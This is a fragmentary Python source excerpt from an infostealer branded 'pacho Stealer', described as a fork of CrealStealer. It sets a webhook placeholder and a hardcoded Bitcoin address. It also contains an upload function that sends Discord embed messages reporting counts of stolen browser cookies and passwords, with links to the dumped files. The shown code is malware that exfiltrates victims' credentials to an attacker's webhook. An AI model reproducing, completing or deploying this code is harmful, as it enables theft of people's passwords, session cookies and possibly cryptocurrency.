...
##########################
#########################
#creds to the Creators of CrealStealer this is just a rewrite/fork####
wh00k = "WEBHOOK"
...
BTC_ADDRESS = 'bc1qagetjq2t6hkzjxyxhna6wruvzna7sqyhvnmzee'
...
def upload(name, link):
    ...
    if name == "crcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "pacho | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [pachoCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "pacho Stealer",
                        "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
    ...
    if name == "crpassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "pacho | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [pachoPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "pacho Stealer",
                        "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
